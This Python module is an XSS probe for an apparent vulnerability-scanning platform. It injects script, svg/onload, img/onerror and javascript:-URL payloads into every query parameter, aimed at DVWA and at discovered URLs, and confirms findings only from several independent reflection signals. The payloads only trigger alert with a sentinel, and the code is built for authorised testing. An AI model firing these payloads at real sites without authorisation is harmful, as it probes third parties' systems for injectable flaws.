"""
Reflected / DOM XSS Probe (Architecture §5.2, §17 — evidence-based validation).

Closes the platform's XSS coverage gap. The previous fuzzer module emitted XSS
findings on bare substring reflection, which fires on JSON echoes, error pages
quoting the input, and 404 banners. That is ALWAYS noise.

This module instead requires multiple INDEPENDENT signals before reporting:
  1) the FULL payload appears unencoded in the body (no html entity escaping),
  2) Content-Type is HTML (so reflection runs in a parser, not text/json),
  3) the reflection lands in an EXECUTABLE context  — inside <script>, an
     event-handler attribute, <svg>, javascript: URL, etc.,
  4) a differential vs the baseline shows the response actually changed.

It targets DVWA's `/xss_r/?name=` and `/xss_d/?default=` plus any param-bearing
URL Alpha discovers, and propagates the authenticated cookie/headers from the
seeder so requests stay inside the live PHP session.
"""

from __future__ import annotations

import html
import re
import urllib.parse

from backend.core.base import BaseArsenalModule
from backend.core.protocol import JobPacket, TaskTarget, Vulnerability
from backend.core.verification import (
    negative_proof_check,
    entropy_delta,
    side_channel_analysis,
    detect_xss_csp_confirmed,
    XSS_CSP_PAYLOAD,
    XSS_MUTATION_PAYLOAD,
    calculate_final_confidence,
    stack_inconsistent_with_vuln,
)

# Sentinel-marked payloads. The `vgvg` token is unique enough to avoid false
# matches against unrelated content while staying small enough to fit DVWA's
# field length limits. Each payload places the sentinel inside a different
# executable HTML context (script, attribute, svg/onload, javascript: URL,
# style, iframe, broken-tag).
_SENTINEL = "vgvg789"
_PAYLOADS = (
    f"<script>x={_SENTINEL}</script>",
    f"\"><svg/onload=alert('{_SENTINEL}')>",
    f"<img src=x onerror=alert('{_SENTINEL}')>",
    f"<a href=\"javascript:alert('{_SENTINEL}')\">x</a>",
    f"';alert('{_SENTINEL}');//",
    f"\"-alert('{_SENTINEL}')-\"",
    f"<body onload=alert('{_SENTINEL}')>",
    f"<iframe src=javascript:alert('{_SENTINEL}')>",
)

# Common XSS-prone parameter names used by training apps + real apps. We always
# include the one already in the URL plus a few "default" sinks DVWA exposes.
_PRIORITY_PARAMS = (
    "name",
    "default",
    "q",
    "search",
    "input",
    "message",
    "comment",
    "user",
    "page",
    "txt",
    "text",
    "data",
    "value",
)

# Executable HTML contexts: when the payload lands inside one of these we treat
# it as proof of an exploitable XSS sink, not just decorative reflection.
_EXEC_CTX_PATTERNS = (
    re.compile(r"<script[^>]*>[^<]*" + re.escape(_SENTINEL), re.I),  # in <script>
    re.compile(r"on[a-z]+\s*=\s*['\"][^'\"]*" + re.escape(_SENTINEL), re.I),  # event handler
    re.compile(r"<svg[^>]*onload[^>]*" + re.escape(_SENTINEL), re.I),  # svg/onload
    re.compile(r"javascript:[^\"']*" + re.escape(_SENTINEL), re.I),  # javascript: URL
    re.compile(r"<iframe[^>]*src\s*=\s*['\"]?javascript:[^>]*" + re.escape(_SENTINEL), re.I),
    re.compile(r"<img[^>]*onerror[^>]*" + re.escape(_SENTINEL), re.I),
    re.compile(r"<body[^>]*onload[^>]*" + re.escape(_SENTINEL), re.I),
)


def _content_type_is_html(text: str) -> bool:
    """Detect an HTML response from an embedded content-boundary header marker
    (the agents wrap responses with content_boundary which prefixes Content-Type)
    or from a literal HTML structure."""
    low = (text or "").lower()
    if "content-type" in low and "text/html" in low:
        return True
    return any(tag in low for tag in ("<!doctype html", "<html", "<head", "<body"))


def _payload_is_unencoded(text: str, payload: str) -> bool:
    """The payload must reflect VERBATIM. If the server html-escaped it (the
    safe behaviour) we should NOT confirm — even though the sentinel still
    appears as text, the angle brackets are gone."""
    if not text or not payload:
        return False
    if payload in text:
        return True
    # Reject the case where the same payload only shows up html-escaped.
    if payload not in text and html.escape(payload) in text:
        return False
    return False


def _executable_context(text: str) -> str | None:
    for pat in _EXEC_CTX_PATTERNS:
        m = pat.search(text or "")
        if m:
            return m.group(0)[:160]
    return None


class XSSProbe(BaseArsenalModule):
    """Reflected/DOM XSS probe. Confirms with ≥2 independent signals."""

    def __init__(self):
        super().__init__()
        self.name = "XSS Probe"

    async def generate_payloads(self, packet: JobPacket) -> list[TaskTarget]:
        url = packet.target.url
        headers = dict(packet.target.headers or {})
        targets: list[TaskTarget] = []

        # Always include the unmodified target as the BASELINE (index 0).
        targets.append(
            TaskTarget(url=url, method=packet.target.method or "GET", headers=headers, payload=packet.target.payload)
        )

        if "?" not in url:
            return targets

        base, query = url.split("?", 1)
        params = urllib.parse.parse_qs(query, keep_blank_values=True)
        if not params:
            return targets

        # Iterate every existing query param. For each one, try every payload.
        # Preserve all sibling params (so DVWA's `Submit=Submit` companion
        # stays attached when we mutate `id`/`name`/etc).
        target_params = list(params.keys())

        for param in target_params:
            for payload in _PAYLOADS:
                mutated = {k: list(v) for k, v in params.items()}
                mutated[param] = [payload]
                attack = f"{base}?{urllib.parse.urlencode(mutated, doseq=True)}"
                targets.append(
                    TaskTarget(url=attack, method="GET", headers=dict(headers), payload=packet.target.payload)
                )

        # Method 7: Add CSP/MutationObserver payloads for deterministic XSS proof
        for csp_payload in (XSS_CSP_PAYLOAD, XSS_MUTATION_PAYLOAD):
            for param in target_params:
                mutated = {k: list(v) for k, v in params.items()}
                mutated[param] = [csp_payload]
                attack = f"{base}?{urllib.parse.urlencode(mutated, doseq=True)}"
                targets.append(
                    TaskTarget(url=attack, method="GET", headers=dict(headers), payload=packet.target.payload)
                )

        return targets

    async def analyze_responses(
        self, interactions: list[tuple[TaskTarget, str]], packet: JobPacket
    ) -> list[Vulnerability]:
        from backend.modules.evidence import differential

        vulns: list[Vulnerability] = []
        if not interactions:
            return vulns
        baseline_target, baseline_text = interactions[0]
        baseline_text = baseline_text if isinstance(baseline_text, str) else ""

        seen: set[str] = set()
        for idx, (target, text) in enumerate(interactions):
            if idx == 0 or not isinstance(text, str) or not text:
                continue
            # Reconstruct which payload was injected for this target.
            payload = self._payload_in_url(target.url)
            if not payload:
                continue

            signals: list[str] = []

            # Signal 0 (HARD GATE): Content-Type must be HTML. Without HTML
            # parsing the executable contexts below are inert text. JSON, XML,
            # and plain echoes never confirm.
            html_ctype = _content_type_is_html(text)
            if not html_ctype:
                continue
            signals.append("html_content_type")

            # Signal 1: full payload reflected unencoded in body.
            if _payload_is_unencoded(text, payload):
                signals.append("full_payload_reflected_unencoded")

            # Signal 2: reflection landed in an executable HTML context.
            ctx = _executable_context(text)
            if ctx:
                signals.append("executable_context")

            # Signal 3: response differs materially from the baseline.
            ev = differential(baseline_text, text)
            if ev.signals >= 1 or ev.verified:
                signals.append("response_differential")

            # Method 7: CSP/MutationObserver deterministic proof
            csp_confirmed, csp_evidence = detect_xss_csp_confirmed(text)
            if csp_confirmed:
                signals.append("csp_mutation_proof")

            # Method 3: Negative proof — never confirm on JSON responses
            is_genuine, neg_reasons = negative_proof_check(text, baseline_text, "XSS")
            if not is_genuine:
                continue

            # Confirm only when at least 2 independent signals agree, and one
            # of them must be a real reflection signal (no diff-only XSS).
            reflection_signal = (
                "full_payload_reflected_unencoded" in signals
                or "executable_context" in signals
                or "csp_mutation_proof" in signals
            )
            if not reflection_signal or len(set(signals)) < 2:
                continue

            key = f"{target.url}|{payload}"
            if key in seen:
                continue
            seen.add(key)

            # Method 14: Entropy analysis
            ent_d = entropy_delta(baseline_text, text)
            if abs(ent_d) > 0.5:
                signals.append("entropy_change")

            # Method 9: Side-channel analysis
            sc_ok, sc_desc = side_channel_analysis(200, len(baseline_text), 200, len(text), "XSS")
            if sc_ok:
                signals.append("side_channel")

            confidence = calculate_final_confidence(
                base_confidence=0.80 if "executable_context" in signals else 0.70,
                has_negative_proof_pass=is_genuine,
                has_semantic_marker="csp_mutation_proof" in signals,
                has_side_channel="side_channel" in signals,
                has_entropy_signal="entropy_change" in signals,
            )

            kind = "DOM-based" if "/xss_d" in target.url else "Reflected"
            vulns.append(
                Vulnerability(
                    name=f"{kind} Cross-Site Scripting (XSS)",
                    severity="HIGH",
                    description=(
                        f"Injected payload reflected unencoded inside an executable HTML "
                        f"context. Multiple independent signals agree: {', '.join(signals)}."
                    ),
                    evidence=(
                        f"Target: {target.url}\n"
                        f"Payload: {payload}\n"
                        f"Context match: {ctx or 'n/a'}\n"
                        f"CSP/Mutation proof: {csp_evidence}\n"
                        f"Differential: {ev.summary}"
                    ),
                    remediation=(
                        "Context-aware output encoding (HTML, attribute, JS, URL). "
                        "Add a strict Content-Security-Policy that disallows inline "
                        "scripts and unsafe-eval."
                    ),
                    confidence=confidence,
                )
            )
            # One confirmed XSS per target URL is enough; don't spam variants.
            break

        return vulns

    @staticmethod
    def _payload_in_url(url: str) -> str:
        """Extract the original payload that this target carried, regardless
        of which parameter it was injected into."""
        try:
            _, query = url.split("?", 1)
        except ValueError:
            return ""
        params = urllib.parse.parse_qs(query, keep_blank_values=True)
        for values in params.values():
            for v in values:
                # Identifying token from our payload set.
                if _SENTINEL in v:
                    return v
        return ""
